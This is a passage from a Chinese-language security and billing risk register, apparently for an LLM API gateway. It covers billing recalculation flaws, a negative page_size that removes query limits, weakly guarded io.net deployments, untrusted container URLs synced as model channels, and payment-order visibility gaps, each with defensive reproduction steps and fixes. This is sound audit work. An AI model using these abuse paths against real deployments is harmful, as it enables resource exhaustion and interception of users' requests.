- 可能后果：运营在任务排队期间涨价，待完成任务会按新价格补扣，用户看到的提交时价格和最终扣费不一致；运营降价或临时把倍率改低，待完成任务会按新低价退款或少补扣，平台承担已经按旧价预期售出的上游成本。更隐蔽的是日志 `other` 里显示的是提交时 `BillingContext` 快照，但实际 `reason` 使用的是当前倍率，审计人员可能看到互相矛盾的价格依据。多实例配置漂移时，不同实例轮询同一批任务还可能按不同倍率重算。
- 复现思路：提交一个会返回 `TotalTokens` 的异步视频任务，记录提交时 `BillingContext.ModelRatio/GroupRatio` 和预扣额度；在任务完成前修改 `ModelRatio` 或 `GroupRatio`；触发轮询完成，观察 `RecalculateTaskQuotaByTokens` 的补扣/退款是否按新倍率计算，而不是按任务快照计算。检查退款/补扣日志中 `other.model_ratio/group_ratio` 与 `reason` 字符串里的倍率是否不一致。
- 修复建议：token 重算必须优先使用 `task.PrivateData.BillingContext.ModelRatio`、`GroupRatio`、`ModelPrice` 和 `OtherRatios`，缺失时才回退当前配置并标记 `legacy_pricing_fallback=true`。`BillingContext` 应保存 special group ratio 的最终值和来源，不应在完成阶段再次读取用户当前分组倍率。价格配置变更时应明确只影响新请求；如确需影响在途任务，必须有显式迁移/重算任务和审计日志。
- 优先级：P1
- 当前状态：已确认 `BillingContext` 保存了价格快照，但 token 重算没有使用其中的模型/分组倍率；尚未补充单元测试模拟价格变更。

### 风险 161：异步任务退款/差额结算先调资金来源再 best-effort 调 token，token 失败会被吞掉并记录成功日志

- 标题：`RefundTaskQuota` 和 `RecalculateTaskQuota` 在钱包/订阅调整成功后调用 `taskAdjustTokenQuota`；该函数查询 token key 或调整 token 失败时只写 warn 并返回，外层继续更新任务 quota、用户/渠道统计和账单日志，缺少回滚、待补偿状态或错误返回
- 影响范围：异步任务失败退款、异步任务成功差额补扣/退款、有限额度 token、订阅资金来源、用户钱包、token `remain_quota/used_quota`、任务账单日志、客服对账
- 触发条件：任务完成或失败时需要退款/补扣；任务的 `PrivateData.TokenId` 对应 token 被删除、查询失败、DB 更新失败、Redis/批量队列异常，或 token 调整函数返回错误；钱包/订阅资金来源调整已经成功。
- 涉及文件/函数：
  - `service/task_billing.go:71-80`：`resolveTokenKey` 在 token 被删除或查询失败时只返回空字符串
  - `service/task_billing.go:98-117`：`taskAdjustTokenQuota` 在 token key 为空时直接返回；`IncreaseTokenQuota/DecreaseTokenQuota` 返回错误也只 `LogWarn`，不把错误返回给调用方
  - `service/task_billing.go:150-181`：`RefundTaskQuota` 先调用 `taskAdjustFunding(task, -quota)` 退钱包/订阅，随后 best-effort 退 token，最后无条件记录退款日志
  - `service/task_billing.go:187-245`：`RecalculateTaskQuota` 先调整钱包/订阅差额，随后 best-effort 调整 token；即使 token 调整失败也会设置 `task.Quota=actualQuota`，差额补扣还会增加用户/渠道统计并记录日志
  - `model/token.go:375-431`：token 增减会更新 `remain_quota/used_quota`，但可能因 DB、Redis 或批量队列问题失败或延迟
  - `service/task_billing_test.go:191-245`：现有测试覆盖 token 正常退款的 happy path，未覆盖 token 删除/调整失败后的半成功状态
  - 对比证据：`service/billing_session.go:59-72` 至少会把同步请求后结算的 token 错误作为 `tokenErr` 返回并写系统日志；任务路径完全不返回错误
- 可能后果：失败任务退款时，用户钱包或订阅额度已返还，但 token `remain_quota` 没有恢复，用户后续用该 token 仍可能被错误限流或显示已用额度偏高；成功任务补扣时，用户钱包或订阅已多扣，但 token 额度没有同步扣减，泄露的 token 仍可继续用旧预算调用，绕过子 key 预算边界。由于任务日志已经记录“退款/补扣成功”，客服和对账系统会误以为资金与 token 都完成调整，只能从 warn/syslog 里人工发现缺口。
- 复现思路：创建一个有限额度 token 提交异步任务并进入待完成状态；在任务完成/失败前删除该 token 或模拟 `IncreaseTokenQuota/DecreaseTokenQuota` 返回错误；触发 `RefundTaskQuota` 或 `RecalculateTaskQuota`。观察用户钱包/订阅已经调整、任务日志已记录退款/补扣，但 token `remain_quota/used_quota` 没有对应变化，也没有 pending compensation 记录。
- 修复建议：任务资金调整和 token 调整应进入同一账务流水或 outbox：任一阶段失败都写入 `pending_task_billing_delta`，包含 task id、funding delta、token delta、已完成阶段、重试次数和最后错误。`taskAdjustTokenQuota` 应返回错误，`RefundTaskQuota/RecalculateTaskQuota` 不应在 token 失败时记录全成功日志；至少要在日志 `other` 中标记 `token_adjust_failed=true` 并阻断该 token 后续使用或进入待修复状态。删除 token 时也应保留可结算 tombstone，直到关联任务全部终态。
- 优先级：P1
- 当前状态：已确认任务路径 token 调整失败不会向外返回，且外层会继续写成功型退款/补扣日志；尚未补充失败注入测试。

### 风险 162：通用分页未拒绝负 `page_size`，日志/任务列表可能退化为无限制查询和大响应

- 标题：`GetPageQuery` 只把过大的 `page_size` 截断到 100，没有把小于 1 的页大小重置为默认值；GORM 明确支持用 `Limit(-1)` 取消 limit，导致传入 `page_size=-1` 的列表接口可能返回远超预期的数据量
- 影响范围：普通用户日志列表、普通用户任务列表、管理员日志列表、管理员任务列表，以及其他复用 `common.GetPageQuery` 后把 `GetPageSize()` 直接传入 `Limit` 的分页接口；本轮重点确认 `/api/log/self`、`/api/task/self`、`/api/log/`、`/api/task/`
- 触发条件：调用分页接口时传入负数页大小，例如 `page_size=-1`、`ps=-1` 或 `size=-1`；目标账号或全站表中存在大量日志/任务记录；数据库方言和当前 GORM 版本按 `Limit(-1)` 取消限制生成查询。
- 涉及文件/函数：
  - `common/page_info.go:17-26`：`GetStartIdx` 直接使用 `PageSize` 计算 offset，`GetPageSize` 原样返回页大小
  - `common/page_info.go:41-79`：`GetPageQuery` 解析 `page_size/ps/size` 后只处理 0 和 `>100`，没有拒绝或归一化 `<1` 的值
  - `gorm.io/gorm@v1.25.2/chainable_api.go:322-330`：本地依赖源码注释说明 `Limit(-1)` 会取消 limit
  - `router/api-router.go:311-318`：`/api/log/` 挂管理员鉴权，`/api/log/self` 挂用户鉴权
  - `controller/log.go:13-47`：日志接口把 `pageInfo.GetStartIdx()` 和 `pageInfo.GetPageSize()` 直接传入模型层
  - `model/log.go:411-416`：管理员日志先 `Count`，再 `Limit(num).Offset(startIdx).Find`
  - `model/log.go:494-499`：用户日志先尝试计数，再 `Limit(num).Offset(startIdx).Find`
  - `controller/task.go:22-66`：任务接口同样把分页参数原样传入模型层
  - `model/task.go:211-239`：用户任务列表在 `user_id = ?` 过滤后执行 `Limit(num).Offset(startIdx)`
  - `model/task.go:247-284`：管理员任务列表按过滤条件查询后执行 `Limit(num).Offset(startIdx)`
  - `controller/topup.go`、`controller/invite.go`、`controller/channel.go`、`controller/redemption.go`、`controller/model_meta.go`、`controller/vendor_meta.go`、`controller/deployment.go`、`controller/midjourney.go`、`controller/user.go`、`controller/token.go`：均存在 `GetPageQuery` 调用，需按同类缺陷逐一确认影响面
- 可能后果：普通用户可以用自己的大量日志或任务记录制造超大响应，使 API 进程分配大量内存、序列化大量 JSON、拉高 DB 查询时间和网络流量；管理员接口如果被误用或被低权限后台账号滥用，可能一次性扫描全站日志/任务表，放大日志表 `Count` 和列表查询压力。由于返回体仍是正常成功响应，监控只会看到慢查询和大流量，不容易被归类为参数异常。
- 复现思路：在本地测试库为同一用户准备大量日志或异步任务记录，分别请求 `/api/log/self?page_size=-1`、`/api/task/self?page_size=-1`、管理员 `/api/log/?page_size=-1`、`/api/task/?page_size=-1`；开启 GORM SQL 日志或抓取慢查询，确认生成 SQL 是否没有 `LIMIT 100`，响应 `items` 数量是否超过默认分页上限。再对 `ps=-1`、`size=-1` 做兼容参数复测。
- 修复建议：在 `GetPageQuery` 层统一约束 `PageSize`，任何 `<1`、解析失败或超过上限的值都应归一化为默认值或上限；建议同时限制 `Page` 的最大值，防止超大 offset 扫描。为所有分页接口补充共享单元测试，覆盖 `page_size=-1/0/1/100/101`、`ps=-1`、`size=-1`，并验证模型层不会收到负 `num`。对日志和任务这类大表接口，可额外要求必须带时间范围或对最大可查询窗口做后端限制。
- 优先级：P1
- 当前状态：已确认共享分页函数允许负页大小，日志/任务模型层直接传给 GORM `Limit`，且本地 GORM 版本注释确认 `Limit(-1)` 会取消限制；尚未对所有复用 `GetPageQuery` 的接口逐一确认实际 SQL 和数据泄露范围。

### 风险 163：io.net 部署创建/延期直接消耗外部云资源，但只挂 `AdminAuth` 且没有预算锁定、本地成本流水和高危二次确认

- 标题：模型部署管理接口把创建、更新、延期、删除部署等外部云资源操作放在统一 `AdminAuth` 路由下；`CreateDeployment` 和 `ExtendDeployment` 将请求体直接交给 io.net enterprise API，本地不要求 Root/安全验证、不绑定价格预估快照、不检查站点预算或单次成本上限，也不写本地 deployment 订单/成本流水
- 影响范围：io.net 企业 API key、外部云资源余额、模型部署成本、管理员账号安全、运营预算、部署审计、客服/财务对账
- 触发条件：站点开启 `model_deployment.ionet.enabled` 并配置 API key；任一满足 `AdminAuth` 的后台会话或系统 access token 调用 `/api/deployments` 创建部署，或调用 `/api/deployments/:id/extend` 延期；请求中选择高价 hardware、多个 location、较大 `replica_count`、较大 `gpus_per_container` 或较长 `duration_hours`。
- 涉及文件/函数：
  - `router/api-router.go:381-404`：`/api/deployments` 整组只使用 `AdminAuth`，创建、更新、改名、延期、删除都没有 `RootAuth`、`CriticalRateLimit`、`DisableCache` 或 `SecureVerificationRequired`
  - `controller/deployment.go:16-25`：只检查功能开关和 API key 是否存在，没有预算、余额、角色分级或操作审批
  - `controller/deployment.go:430-467`：`ExtendDeployment` 绑定 JSON 后直接调用 `client.ExtendDeployment`
  - `controller/deployment.go:494-518`：`CreateDeployment` 绑定 JSON 后直接调用 `client.DeployContainer`
  - `controller/deployment.go:600-618`：`GetPriceEstimation` 只是即时查询价格，没有生成 quote id、过期时间或后续创建校验
  - `pkg/ionet/types.go:34-60`：部署请求包含 `duration_hours/gpus_per_container/hardware_id/location_ids/replica_count/image_url/env/secret/registry` 等影响成本和供应链风险的字段
  - `pkg/ionet/types.go:185-196`：价格预估请求包含 `replica_count/hardware_qty/duration_type/duration_qty/currency` 等成本字段
  - `pkg/ionet/types.go:244-247`：延期请求只有 `DurationHours`
  - `pkg/ionet/deployment.go:17-38`：创建部署只做必填和最小值校验，没有上限、allowlist 或预算校验
  - `pkg/ionet/deployment.go:136-150`：延期只要求 `duration_hours >= 1`
  - `pkg/ionet/deployment.go:187-249`：价格预估会规范 duration type 和数量，但不形成可复用的服务端价格承诺
  - `model/log.go:91-119` 对比：项目已有管理日志能力，但 `controller/deployment.go` 未调用 `RecordLog` 或 `RecordLogWithAdminInfo`
- 可能后果：被盗或误用的普通管理员账号可以直接创建或延期高成本 GPU 部署，消耗外部 io.net 余额；用户先请求低价 `price-estimation`，再提交更高规格的创建请求时，本地没有 quote 绑定可以发现差异；外部 API 成功但本地没有订单表、request id、操作者/IP、预估价、实际价、部署 id 和状态流转，后续很难判断是谁、以什么价格、因什么原因创建了资源。删除或更新部署同样缺少高危确认和结构化审计，可能造成生产部署被误删或配置被篡改。
- 复现思路：在本地或 staging 配置测试 io.net key，先调用 `/api/deployments/price-estimation` 获取低规格价格，再直接调用 `POST /api/deployments` 提交更高 `duration_hours/replica_count/gpus_per_container/hardware_id` 的请求，观察服务端不要求 quote id、预算确认或二次验证。再调用 `/api/deployments/:id/extend` 传入较大 `duration_hours`，检查本地是否产生可对账的成本流水和管理员审计日志。
- 修复建议：将创建、延期、删除和更新部署提升为 Root 或独立 `deployment:write` 权限，并要求 dashboard session、`SecureVerificationRequired`、原因字段和二次确认；禁止系统 access token 默认调用这些外部成本接口。创建/延期前必须生成服务端 quote，保存规格、价格、币种、过期时间和操作者，并在真正创建时校验请求与 quote 完全一致且未过期。增加本地 `deployment_orders`/`external_cost_ledger` 表，记录 request id、operator、old/new spec、estimated_cost、actual_cost、external deployment id、状态、失败原因和重试补偿。为 `duration_hours/replica_count/gpus_per_container/hardware_id/location_ids/image_url/registry` 增加运营上限、allowlist 和预算阈值，超过阈值需要多管理员审批或禁用。
- 优先级：P1
- 当前状态：已确认部署创建/延期会直接调用外部 API，路由只挂 `AdminAuth`，且未看到本地成本流水、quote 绑定、二次验证或部署操作管理日志；尚未用真实 io.net sandbox 验证外部实际扣费行为。

### 风险 165：自定义部署镜像和 `public_url` 可被同步为渠道，上游模型服务缺少镜像 allowlist、运行时限制和信任绑定

- 标题：模型部署允许管理员提交任意 `image_url`、entrypoint、args、env、registry 凭据和 traffic port；容器启动后返回的 `public_url` 会展示给后台，并且 classic 前端可一键把该 URL 创建为 NewAPI 渠道 `base_url`。后端没有校验镜像来源、镜像签名、服务协议、模型能力或 public URL 与部署 ID 的可信绑定
- 影响范围：io.net 外部云资源、NewAPI 渠道路由、模型响应可信度、用户请求/响应隐私、平台外部声誉、上游成本、渠道自动同步、恶意/异常模型服务接入
- 触发条件：管理员或被盗后台账号创建/更新部署，使用自定义镜像或修改 entrypoint/args，使容器暴露一个任意公网 HTTP 服务；随后通过 classic “同步到渠道”或等价接口把容器 `public_url` 作为渠道 `base_url` 接入，或者其他管理员误以为该部署是可信模型服务并手动配置渠道。
- 涉及文件/函数：
  - `router/api-router.go:381-404`：deployment 创建、更新、删除、容器详情和 public URL 查询均在 `AdminAuth` 组内
  - `controller/deployment.go:400-428`：`UpdateDeployment` 绑定 JSON 后直接调用 `client.UpdateDeployment`，可更新镜像、entrypoint、args、env、secret、port 等字段
  - `controller/deployment.go:494-518`：`CreateDeployment` 直接把部署请求转发给 io.net
  - `controller/deployment.go:706-758`：容器列表把上游 `ctr.PublicURL` 原样返回给前端
  - `pkg/ionet/types.go:34-60`：部署请求结构包含 `RegistryConfig.ImageURL`、registry 凭据、普通/secret env、entrypoint、args 和 traffic port
  - `pkg/ionet/types.go:231-240`：更新请求同样允许修改 `ImageURL`、registry 凭据、entrypoint、args、command、env 和 secret env
  - `pkg/ionet/deployment.go:17-40`：创建部署只校验必填、GPU/时长/副本最小值和 image URL 非空，没有镜像 allowlist 或签名校验
  - `pkg/ionet/deployment.go:110-134`：更新部署只检查 deployment id 和请求非空，随后 PATCH 到外部 API
  - `web/default/src/features/models/components/dialogs/create-deployment-drawer.tsx:74-90`：default 创建表单只要求 `image_url` 非空，traffic port 在 1-65535，未限制镜像来源
  - `web/default/src/features/models/components/dialogs/update-config-dialog.tsx:53-63`、`168-196`：更新表单允许提交 image、traffic port、entrypoint、args、command、env、secret env 和 registry secret
  - `web/classic/src/hooks/model-deployments/useDeploymentsData.jsx:343-401`：classic 从容器列表取第一个 `public_url`，生成随机 key，把 `base_url` 设置为该 URL 并调用 `/api/channel/` 创建 tag 为 `ionet` 的渠道
  - `web/default/src/features/models/components/dialogs/view-details-dialog.tsx:221-249`、`web/classic/src/components/table/model-deployments/modals/ViewDetailsModal.jsx:427-435`：前端允许直接打开容器 public URL
- 可能后果：平台 io.net 账号可被用来运行非预期公网服务，例如代理、扫描器、挖矿、数据外传工具或伪装的 OpenAI 兼容服务；一旦同步成渠道，普通用户的模型请求可能被路由到恶意容器，导致 prompt、文件、响应内容、Authorization 相关元信息或业务数据被该容器读取和篡改。本地渠道看起来带 `ionet` 标签并使用随机 key，运营人员可能误认为它是可信部署。即使没有恶意，错误镜像或错误端口也会把不兼容服务接入模型调用链，造成大量失败、重试、自动禁用和客服问题。
- 复现思路：在 staging 以自定义镜像创建一个简单 HTTP echo 服务，开放 traffic port；容器返回 `public_url` 后使用 classic 同步渠道功能，观察新渠道 `base_url` 是否直接指向该 public URL。再用测试 token 调用该渠道支持的模型，确认请求是否到达自定义容器。全程只在隔离环境和自有测试镜像上验证，不连接生产 io.net 资源。
- 修复建议：把 deployment 目标从“任意容器”收敛为“受信模型服务”：后端维护镜像 allowlist 或签名验证，只允许固定 registry、digest pinning 和已审计 entrypoint；禁止或严格审批自定义 image/command/entrypoint/args。`public_url` 同步渠道前必须执行服务探测、模型能力校验、TLS/域名校验和 deployment id 绑定校验，并要求 Root/二次确认。渠道 `other_info` 应记录 deployment id、container id、镜像 digest、创建人和验收结果；部署更新后应自动暂停关联渠道，直到重新验收。对 public URL 只允许通过受控反向代理或专用服务发现接入，不应让任意公网 URL 直接成为上游 base URL。
- 优先级：P1
- 当前状态：已确认创建/更新部署缺少镜像/entrypoint/registry allowlist，容器 `public_url` 会返回前端，classic 前端可把该 URL 直接创建为渠道；尚未用真实 io.net 部署验证请求链路。

### 风险 166：io.net 部署删除/更新/终止后没有服务端联动禁用关联渠道，旧 `public_url` 渠道可能继续接流量

- 标题：classic 前端把 io.net 容器 `public_url` 同步为渠道时，仅把 `deployment_id/container_id/public_url` 写进渠道 `other_info`；后端没有 deployment-channel 关系表，也没有在删除、更新、延期、终止或部署失败时扫描并禁用/重验这些渠道。部署失效后，关联渠道仍可能保持 enabled，直到请求失败触发普通渠道错误处理或人工发现
- 影响范围：io.net 同步渠道、渠道路由、用户模型调用、自动禁用、渠道成本统计、部署更新/删除、运营可用性、模型能力一致性
- 触发条件：管理员通过 classic 把某个 io.net deployment 同步为渠道；随后该 deployment 被删除、终止、更新镜像/端口/entrypoint、运行失败、public URL 变化或容器重建；本地渠道仍保留旧 `base_url` 和 enabled 状态。
- 涉及文件/函数：
  - `web/classic/src/hooks/model-deployments/useDeploymentsData.jsx:343-401`：同步渠道时把 `public_url` 写入 `channel.base_url`，把 `deployment_id/container_id/public_url` 写进 `other_info`
  - `controller/channel.go:587-685`：`AddChannel` 只做普通渠道校验和 `BatchInsertChannels`，没有识别 `other_info.source=ionet` 或建立服务端关联
  - `model/channel.go:23-60`：渠道表只有通用 `BaseURL/OtherInfo/Tag/Status` 字段，没有 deployment 外键、状态快照或 last verified deployment 状态
  - `controller/deployment.go:400-428`：`UpdateDeployment` 更新外部部署后只返回 deployment id，不暂停或重验关联渠道
  - `controller/deployment.go:469-491`：`DeleteDeployment` 只调用 io.net 删除接口并返回成功消息，不查询/禁用本地 `tag=ionet` 或 `other_info.deployment_id` 匹配的渠道
  - `controller/deployment.go:706-758`：容器列表只返回当前 public URL，不与已同步渠道做 diff
  - `web/classic/src/components/table/channels/ChannelsColumnDefs.jsx:86-125`、`web/default/src/features/channels/components/channels-columns.tsx:627-632`：前端只把 `other_info.source=ionet` 作为展示/跳转元信息，没有生命周期处理
  - 全局搜索 `ionet/deployment_id/public_url/other_info`：后端除 deployment 控制器和通用 channel 字段外未发现关联渠道清理、重验或禁用逻辑
- 可能后果：部署被删除或终止后，用户请求仍会被路由到旧 public URL，造成大量失败、重试、自动禁用噪音和客服投诉；如果旧 public URL 被第三方复用或指向不同服务，渠道可能把用户请求发给非预期上游。部署更新镜像或端口后，渠道仍指向旧能力和旧模型集合，可能出现模型能力不一致、错误扣费、渠道统计归因混乱。运营看到 deployment 已删除，但 NewAPI 渠道仍 enabled，会产生“资源已下线但还在接流量”的隐蔽状态。
- 复现思路：在 staging 同步一个 io.net deployment 为渠道，记录渠道 `base_url` 和 `other_info.deployment_id`；调用 `/api/deployments/:id` 删除或更新该 deployment；查询渠道列表确认对应 `tag=ionet` 渠道是否仍 enabled、`base_url` 是否仍旧值；随后用测试 token 触发该渠道请求，观察是否继续进入路由并直到请求失败才被普通错误路径处理。
- 修复建议：新增服务端 deployment-channel 绑定表或结构化解析 `other_info` 的索引字段，记录 deployment id、container id、public URL、镜像 digest、同步时间和验收状态。删除、终止、更新部署前后必须事务性暂停或标记关联渠道 `needs_revalidation`；public URL 变化时自动更新或禁用旧渠道。渠道调度前对 `source=ionet` 且 deployment 状态非 running/verified 的渠道 fail closed；部署轮询或列表刷新时同步关联渠道状态。所有自动禁用/重启用都写管理日志，并在前端渠道表展示“部署已删除/需重验”。
- 优先级：P1
- 当前状态：已确认同步渠道只写普通 `other_info`，后端删除/更新 deployment 不联动本地渠道；尚未验证普通渠道自动禁用能否及时兜底旧 public URL 失败。

### 风险 169：违规扣费在免费模型跳过 BillingSession 或 playground 路径下仍直接 PostConsumeQuota，可能绕过资金来源选择并扣成负余额

- 标题：`ChargeViolationFeeIfNeeded` 在上游返回 Grok CSAM/usage-guideline 标记后直接调用 `PostConsumeQuota` 扣违规费；当免费模型被配置为跳过预消耗、没有建立 `BillingSession`，或处于 playground 边界时，违规费会落到旧扣费路径，可能默认扣钱包并绕过余额预检
- 影响范围：Grok 违规扣费、免费模型、`quota_setting.enable_free_model_pre_consume=false` 的站点配置、playground、用户钱包余额、订阅优先级、token remain/used 统计、channel used_quota、消费日志和客服对账
- 触发条件：上游错误文本包含 `Failed check: SAFETY_CHECK_TYPE` 或 `Content violates usage guidelines`，且 Grok 违规扣费开关启用、基础金额大于 0、分组倍率大于 0；请求已经进入 relay defer；同时满足免费模型被标记为 `FreeModel` 并跳过 `PreConsumeBilling`，或其他路径没有在 `RelayInfo` 上建立明确 `BillingSource`。playground 路径还会因为 `ChargeViolationFeeIfNeeded` 中跳过 playground 的 guard 被注释而继续尝试收费。
- 涉及文件/函数：
  - `service/violation_fee.go:20-82`：通过固定 marker 识别上游违规错误，并把 Grok CSAM 错误标准化为 `violation_fee.grok.csam`
  - `service/violation_fee.go:104-128`：`ChargeViolationFeeIfNeeded` 没有跳过 playground，命中后直接 `PostConsumeQuota(relayInfo, feeQuota, 0, true)`
  - `service/violation_fee.go:131-160`：违规扣费成功后更新用户/渠道 used quota 并记录带 `violation_fee` metadata 的消费日志
  - `controller/relay.go:136-142`：本地敏感词命中发生在价格计算和 defer 注册之前，会直接返回，不会触发违规扣费
  - `controller/relay.go:161-178`：`priceData.FreeModel` 时跳过 `PreConsumeBilling`；异常 defer 先退款已有 BillingSession，再调用 `ChargeViolationFeeIfNeeded`
  - `relay/helper/price.go:123-139`：当 `EnableFreeModelPreConsume` 关闭且模型价格/倍率为 0 时会把请求标记为 `FreeModel`
  - `setting/operation_setting/quota_setting.go:5-12`：免费模型预消耗是可配置开关，默认开启，但可被运营关闭
  - `service/quota.go:406-445`：`PostConsumeQuota` 只有 `BillingSource == subscription` 时扣订阅，否则默认走钱包；playground 会跳过 token 调整
  - `model/user.go:1034-1057`：`DecreaseUserQuota` 只拒绝负入参，不检查扣减后余额是否小于 0
  - `setting/model_setting/grok.go:11-14`：Grok 违规扣费默认启用，默认金额为 0.05
- 可能后果：站点关闭免费模型预消耗后，用户可对 0 价格/0 倍率模型发起请求，正常调用不建立 `BillingSession`；若上游返回违规 marker，系统仍会扣一笔违规费，并且在没有订阅资金来源上下文时默认扣钱包。低余额或 0 余额用户可能被扣成负数；原本期望由订阅承担或完全免费的模型会产生钱包账单；playground 场景可能只更新钱包、用户/渠道 used quota 和日志，而 token 统计被跳过，导致运营看板、渠道成本和用户账单口径不一致。
- 复现思路：在 staging 配置 `quota_setting.enable_free_model_pre_consume=false`，设置某个 Grok 兼容模型价格或倍率为 0，开启默认违规扣费并把测试用户钱包置为 0 或极低；用测试 channel/fake upstream 返回包含 `Failed check: SAFETY_CHECK_TYPE` 的错误；观察请求失败后 `users.quota` 是否变负、消费日志是否记录 `violation_fee`、`relayInfo.BillingSource` 是否为空导致钱包路径生效。另在 playground 环境模拟同类上游错误，观察 token 额度是否未变但用户/渠道统计已增加。不要对生产上游或真实用户做违规内容测试。
- 修复建议：违规扣费应先建立明确资金来源策略，不能在没有 `BillingSession` 或 `BillingSource` 时默认落钱包；对于免费模型，建议明确产品语义：要么免费模型违规费也必须走一次独立 BillingSession 并做余额/订阅预检，要么在免费模型和 playground 中显式跳过违规扣费。`PostConsumeQuota` 的钱包扣减应支持条件更新或余额下限校验，避免任何旧路径把余额扣成负数。违规费最好写入独立账本和补偿状态，失败时可审计，而不是只依赖消费日志和 used_quota 统计。
- 优先级：P1
- 当前状态：已确认本地敏感词命中不会触发违规扣费；风险集中在上游违规 marker 进入 relay defer 后，且免费模型跳过 BillingSession 或 playground/无资金来源上下文时，`ChargeViolationFeeIfNeeded` 仍会调用旧 `PostConsumeQuota`。尚未做 staging fake upstream 复现实验。

### 风险 171：钱包账单前端不识别 `failed` 状态，失败订单会被展示为 Pending

- 影响范围：普通充值账单、管理员充值记录、客服排查、用户自助判断是否需要重新支付、失败订单人工补单判断。
- 触发条件：Waffo、Waffo Pancake 或 Stripe async payment failed 等路径把普通 `top_ups.status` 写成 `failed` 后，用户或管理员通过钱包账单弹窗查看该记录。
- 涉及文件/函数：
  - `common/constants.go:270-273`：后端状态包含 `pending/success/failed/expired`。
  - `controller/topup_stripe.go:220-250`：Stripe 异步支付失败会把 pending 普通充值标记为 `failed`。
  - `controller/topup_waffo.go:217-228`、`controller/topup_waffo.go:272-279`、`controller/topup_waffo.go:382`：Waffo 创建或非成功回调路径会把订单标为 `failed`。
  - `controller/topup_waffo_pancake.go:392-414`：Waffo Pancake 创建 checkout 失败后把本地普通充值标为 `failed`。
  - `web/default/src/features/wallet/types.ts:318-345`：`TopupStatus` 只声明 `success | pending | expired`，没有 `failed`。
  - `web/default/src/features/wallet/lib/billing.ts:35-55`：`STATUS_CONFIG` 没有 `failed`，未知状态通过 `STATUS_CONFIG[status] || STATUS_CONFIG.pending` 回退为 Pending。
  - `web/default/src/features/wallet/components/dialogs/billing-history-dialog.tsx:185-229`：账单状态徽章直接使用 `getStatusConfig(record.status)`，因此后端返回 `failed` 时 UI 会显示 Pending。
  - `web/default/src/features/wallet/components/dialogs/billing-history-dialog.tsx:264-276`：管理员补单按钮使用原始 `record.status === 'pending'` 判断，失败记录不会出现按钮，但状态徽章仍显示 Pending，形成展示和操作不一致。
- 可能后果：用户看到失败订单仍显示 Pending，可能误以为支付还在处理中而重复咨询或等待；管理员列表中失败订单显示 Pending 但不能补单，容易误判为按钮或权限异常；客服如果按截图而非原始状态排查，可能把已经失败的订单当作长期待支付订单处理。
- 复现思路：在本地测试库插入或通过 Waffo/Waffo Pancake checkout 创建失败路径生成一条 `top_ups.status='failed'` 的普通充值记录，打开钱包账单或管理员充值记录，观察状态徽章是否显示 Pending，同时补单按钮因原始状态不是 pending 而不显示。
- 修复建议：前端 `TopupStatus`、`STATUS_CONFIG`、i18n 文案和筛选条件统一补齐 `failed`；未知状态不要默认显示 Pending，应显示 Unknown/异常状态并保留原始值；管理员视图可增加状态原文和失败原因字段，避免展示状态与可操作性分裂。
- 优先级：P1。
- 当前状态：未修复。

### 风险 172：订阅支付订单缺少用户/管理员可见列表，pending/failed/expired 订阅订单容易变成不可见悬挂资产

- 影响范围：订阅购买、订阅支付客服排查、checkout 创建失败、支付过期事件、订阅订单对账、用户重复购买判断。
- 触发条件：订阅购买先创建 `subscription_orders`，但后续 checkout 创建失败、支付过期、webhook 失败或用户放弃支付；订单状态停留在 pending/failed/expired，但没有进入普通充值成功镜像。
- 涉及文件/函数：
  - `model/subscription.go:203-217`：`SubscriptionOrder` 独立保存 `trade_no/payment_provider/status/create_time/complete_time/provider_payload`。
  - `controller/subscription_payment_creem.go:80-119`：Creem 订阅先插入 pending `SubscriptionOrder`，`genCreemLink` 失败时只返回“拉起支付失败”，没有把订单标记 failed，该具体 pending 悬挂已由风险 109 覆盖。
  - `controller/subscription_payment_waffo_pancake.go:74-108`：Waffo Pancake 订阅先插入 pending，checkout 创建失败后更新为 `failed`。
  - `controller/subscription_payment_epay.go:79-103`：Epay 订阅下单失败会调用 `ExpireSubscriptionOrder`。
  - `model/subscription.go:612-684`：订阅订单只有完成 success 时才创建/更新用户订阅并写普通 `top_ups` 镜像。
  - `model/subscription.go:687-720`：`upsertSubscriptionTopUpTx` 只在订阅完成路径写 success 镜像；pending/failed/expired 订阅订单不会进入钱包账单。
  - `model/subscription.go:723-745`：过期订阅订单只改变 `subscription_orders.status`，没有用户可见账单镜像。
  - `controller/topup.go:455-503` 与 `model/topup.go:266-329`：当前用户/管理员账单接口只查询 `top_ups`，不是 `subscription_orders`。
  - 代码搜索仅发现订阅订单创建、完成和过期函数，未发现 `SubscriptionOrder` 的用户列表、管理员列表、状态筛选或清理任务入口。
- 可能后果：用户支付套餐失败或超时后，在钱包账单看不到这笔订阅订单，无法自助确认“失败/过期/处理中”；管理员也缺少按订阅订单号检索、筛选长期 pending、失败原因和 provider payload 的统一入口；Creem pending 悬挂、Stripe 异步失败缺口或 Waffo Pancake failed 订单都可能只能靠数据库和第三方后台排查，增加误补、漏补和重复购买争议。
- 复现思路：在本地走订阅购买创建 pending 订单后模拟 checkout 创建失败或支付过期，检查 `subscription_orders` 中存在 failed/expired/pending 记录；再调用钱包账单和管理员充值记录接口，确认这些非成功订阅订单没有出现在 `top_ups` 账单里。
- 修复建议：为 `subscription_orders` 建立独立的用户/管理员查询接口和前端列表，至少展示 `trade_no/provider/status/create_time/complete_time/plan_id/money/failure_reason`；建立长期 pending 清理/告警任务；订阅支付创建失败必须统一标记 failed 并保存错误摘要；普通充值账单可在成功镜像之外提供“订阅订单” tab，避免只看到成功结果看不到异常过程。
- 优先级：P1。
- 当前状态：未修复。

### 风险 173：普通充值和订阅支付订单没有统一老化清理任务，长期 pending 依赖第三方回调才会收敛

- 影响范围：普通充值订单、订阅支付订单、用户账单列表、管理员订单对账、客服补单、第三方支付回调延迟或缺失场景。
- 触发条件：用户创建支付订单后关闭页面、支付平台未发送过期/失败 webhook、webhook 被配置拒绝、Creem checkout 创建失败、Epay/Waffo 未产生明确终态通知，或系统在回调窗口内重启/丢事件。
- 涉及文件/函数：
  - `main.go:116-132`：启动 Codex credential、订阅额度重置和渠道模型更新任务，没有启动普通充值或订阅支付订单的 pending 老化扫描任务。
  - `service/subscription_reset_task.go:29-93`：订阅维护任务每分钟执行，但只调用 `ExpireDueSubscriptions`、`ResetDueSubscriptions` 和 `CleanupSubscriptionPreConsumeRecords`。
  - `model/subscription.go:926-1011`：`ExpireDueSubscriptions` 处理的是已经生效的 `user_subscriptions` 到期，不处理支付订单 `subscription_orders`。
  - `model/subscription.go:1203-1254`：重置订阅额度和清理预扣幂等记录，不处理 pending/failed/expired 支付订单。
